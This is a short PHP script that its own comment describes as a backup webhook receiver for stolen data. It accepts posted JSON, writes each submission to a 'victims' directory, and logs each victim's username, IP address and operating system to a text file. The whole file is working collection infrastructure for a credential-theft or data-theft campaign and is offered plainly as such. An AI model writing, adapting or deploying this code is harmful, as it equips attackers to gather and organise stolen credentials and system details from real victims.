<?php
// Backup webhook receiver for stolen data
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    if (!$data && isset($_POST['data'])) {
        $data = json_decode($_POST['data'], true);
    }
    
    if ($data) {
        // Save to file with timestamp
        $filename = 'victims/victim_' . date('Y-m-d_H-i-s') . '_' . uniqid() . '.json';
        
        // Create victims directory if it doesn't exist
        if (!is_dir('victims')) {
            mkdir('victims', 0755, true);
        }
        
        // Save data
        file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
        
        // Also log to single file for easy reading
        $log = date('Y-m-d H:i:s') . " | " . 
               ($data['credentials']['username'] ?? 'NO_LOGIN') . " | " . 
               ($data['network']['ip'] ?? 'NO_IP') . " | " . 
               ($data['system']['os'] ?? 'UNKNOWN') . "\n";
        file_put_contents('victims/log.txt', $log, FILE_APPEND);
        
        echo json_encode(['status' => 'success', 'file' => $filename]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'No data received']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
}
?>